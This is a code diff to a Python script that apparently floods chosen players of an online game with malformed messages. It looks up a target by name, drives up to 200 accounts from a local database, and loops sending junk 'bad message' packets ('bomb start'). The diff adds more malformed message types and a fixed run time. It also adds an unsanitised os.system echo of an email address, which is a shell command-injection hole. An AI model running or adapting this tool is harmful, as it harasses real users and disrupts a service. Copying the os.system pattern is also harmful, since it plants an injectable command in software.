@@ -7,6 +7,7 @@ import socket
 import sqlite3
 import json
 import sys
+import os
 
 import aiohttp
 import requests
@@ -108,12 +109,13 @@ async def one(email, targets, wait=0):
             print("bomb start------->>>>>>>")
             while True:
                 for receiver in targets:
-                    writer.write(make_bad_msg_data(b'a'*20, receiver, 3))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 4))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 5))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 6))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 7))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 8))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 9))
                     await asyncio.sleep(0.5)
                     i += 1
                     if i % 20 == 0:
@@ -144,6 +146,7 @@ async def one(email, targets, wait=0):
         except:
             import traceback
             print("wtf!!!!", traceback.format_exc())
+            os.system("echo {} >> bugaccount.txt".format(email))
             await asyncio.sleep(random.randint(20,60))
 
 
@@ -153,15 +156,16 @@ async def count_down(sec):
 
 if __name__ == "__main__":
     print(sys.argv)
-    target_ids, seconds = sys.argv[1:]
-    targets = list(map(int, target_ids.split(",")))
-    seconds = int(seconds)
-    print(targets, seconds)
+    seconds = 1200
+    target = sys.argv[1]
     loop = asyncio.get_event_loop()
     guards = []
     conn = sqlite3.connect("data.db")
     conn.isolation_level = None   # auto commit
     c = conn.cursor()
+    c.execute("SELECT role_id from all_players where name = ?", (target, ))
+    targets = c.fetchone()
+    print(targets, target)
     c.execute("SELECT * FROM guards ORDER BY RANDOM() LIMIT 200")
     idx = 0
     for row in c.fetchall():
